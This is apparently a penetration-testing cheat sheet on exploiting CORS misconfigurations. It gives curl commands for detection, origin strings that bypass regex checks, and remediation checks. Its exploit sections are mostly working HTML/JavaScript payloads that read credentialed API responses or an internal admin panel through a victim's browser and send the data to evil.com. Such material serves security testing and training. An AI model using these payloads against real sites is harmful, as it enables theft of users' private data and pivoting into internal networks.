# CORS Misconfiguration Exploitation

## Detection

```bash
# Test basic reflection
curl -sI -H "Origin: https://evil.com" https://target.com/api/auth | grep -i access-control

# Test null origin
curl -sI -H "Origin: null" https://target.com/api/auth | grep -i access-control

# Test subdomain patterns
curl -sI -H "Origin: https://evil.target.com" https://target.com/api
curl -sI -H "Origin: https://target.computer" https://target.com/api
```

## Exploitation Scenarios

### Reflected Origin with Credentials
```http
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```
```html
<!-- Host on evil.com, victim visits -->
<script>
fetch('https://target.com/api/user/private', {credentials: 'include'})
  .then(r => r.text())
  .then(d => new Image().src = 'https://evil.com/log?data='+encodeURIComponent(d));
</script>
```

### Null Origin Exploit
```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
```html
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    fetch('https://target.com/api/user/profile', {credentials:'include'})
      .then(r => r.text())
      .then(d => new Image().src='https://evil.com/?data='+btoa(d));
  </script>
"></iframe>
```

### Regex Bypass
```python
# Server validates: origin matches ^https?://(.*\.)?target\.com$
# Bypass via:
https://target.com.evil.com
https://target.computer  # . matches any char
https://target.com%40evil.com  # @ confusion
https://target.com\.evil.com  # Safari alternative parser
```

### Wildcard Subdomain Trust
```http
Access-Control-Allow-Origin: https://*.target.com
```
Requires finding XSS on any subdomain → pivot to main domain via CORS.

### Preflight Bypass
```http
# Non-simple requests require OPTIONS preflight
# But some servers allow CORS on preflight but not actual request
# Test: include custom header that triggers preflight
Origin: https://evil.com
Access-Control-Request-Method: PUT
# If preflight allows but actual request rejects, not exploitable
```

## Internal Network Pivoting via CORS

When internal apps have permissive CORS:
```html
<script>
// Read response from internal service via victim's browser
fetch('http://internal.admin-panel/').then(r => r.text()).then(d => { new Image().src='https://evil.com/log?data='+encodeURIComponent(d); });
</script>
```

## Remediation Verification

```bash
# After fix, verify:
curl -s -H "Origin: https://evil.com" -I https://target.com/api
# Should NOT have Access-Control-Allow-Origin header at all
# OR should have Access-Control-Allow-Origin: https://exact-origin.com
```
